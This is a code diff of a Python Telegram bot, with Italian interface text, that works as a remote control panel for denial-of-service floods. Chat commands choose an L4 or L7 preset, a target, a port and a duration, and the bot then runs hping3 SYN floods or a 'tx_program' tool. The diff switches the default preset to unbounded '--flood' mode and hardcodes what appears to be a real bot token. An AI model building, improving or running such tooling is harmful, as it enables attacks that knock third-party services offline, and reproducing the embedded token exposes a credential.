@@ -1,19 +1,9 @@
 #!/usr/bin/env python3
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove, Update
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
-    Updater,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    Filters,
-    ConversationHandler,
-    CallbackContext
+    Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
 )
-import subprocess
-import os
-import signal
-import time
-import threading
+import subprocess, os, signal, time, threading
 
 # ================= CONFIG =================
 TOKEN = "8511925925:AAGRxxH2-ZU0EciOezMA3ToEi2UxtUrIAW0"
@@ -21,18 +11,15 @@ AUTHORIZED_ID = 5699538596
 MAX_DURATION = 600
 # =========================================
 
-HOSTNAME = os.uname().nodename
 process = None
 running = False
 
-# ---------- States ----------
 (
     CHOOSE_MODE,
     CHOOSE_PRESET,
     INPUT_TARGET,
-    INPUT_DURATION,
-    MONITOR
-) = range(5)
+    INPUT_DURATION
+) = range(4)
 
 # ---------- Presets ----------
 L7_PRESETS = {
@@ -41,8 +28,8 @@ L7_PRESETS = {
 }
 
 L4_PRESETS = {
-    "Default": {"cmd": "hping3", "args": "-S -p {port} -d 9999 -c 600"},
-    "Fast": {"cmd": "tx_program", "args": "-p {port} -d 1400 -t 600"}
+    "Default": {"cmd": "hping3", "args": "-S -p {port} -d 9999 --flood"},
+    "Fast": {"cmd": "tx_program", "args": "-p {port} -d 30 -t 600"}
 }
 
 # ---------- UI helpers ----------
@@ -59,16 +46,16 @@ def preset_menu(presets):
 def stop_menu():
     return InlineKeyboardMarkup([[InlineKeyboardButton("⛔ STOP", callback_data="STOP")]])
 
-def progress_bar(p, size=20):
-    filled = int(size * p)
-    return "█" * filled + "░" * (size - filled)
+def progress_bar(progress, size=20):
+    filled = int(size * progress)
+    return "🟪" * filled + "⬛" * (size - filled)
 
 # ---------- /start ----------
 def start(update: Update, context: CallbackContext):
     if update.effective_user.id != AUTHORIZED_ID:
         return
     update.message.reply_text(
-        f"🤖 {HOSTNAME}\nSeleziona modalità:",
+        "🚀 Seleziona modalità",
         reply_markup=main_menu()
     )
     return CHOOSE_MODE
@@ -80,7 +67,6 @@ def choose_mode(update: Update, context: CallbackContext):
     mode = query.data.split(":")[1]
     context.user_data.clear()
     context.user_data["mode"] = mode
-
     presets = L7_PRESETS if mode == "L7" else L4_PRESETS
     query.edit_message_text(
         f"⚙️ {mode} • Seleziona preset",
@@ -147,25 +133,29 @@ def input_duration(update: Update, context: CallbackContext):
         "⏳ Avvio…",
         reply_markup=stop_menu()
     )
-
     threading.Thread(target=animate, args=(context, msg.chat_id, msg.message_id, duration, label), daemon=True).start()
     return ConversationHandler.END
 
 # ---------- ANIMATE ----------
 def animate(context: CallbackContext, chat_id, msg_id, duration, label):
     global running, process
-    for elapsed in range(duration):
-        if not running:
+    start_time = time.time()
+    while running:
+        elapsed = time.time() - start_time
+        if elapsed >= duration:
             break
-        progress = (elapsed + 1) / duration
+        progress = min(elapsed / duration, 1)
         percent = int(progress * 100)
         text = (
             f"🚀 {label}\n\n"
             f"⏳ [{progress_bar(progress)}] {percent}%\n"
-            f"⏱ {duration - elapsed}s"
+            f"⏱ {int(duration - elapsed)}s"
         )
         context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, reply_markup=stop_menu())
-        time.sleep(1)
+        time.sleep(0.5)  # aggiornamento più fluido
+    # Fine
+    if process and process.poll() is None:
+        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
     running = False
     process = None
     context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="✅ Completato", reply_markup=main_menu())
@@ -175,7 +165,7 @@ def stop(update: Update, context: CallbackContext):
     global running, process
     query = update.callback_query
     query.answer()
-    if process:
+    if process and process.poll() is None:
         os.killpg(os.getpgid(process.pid), signal.SIGTERM)
     running = False
     process = None
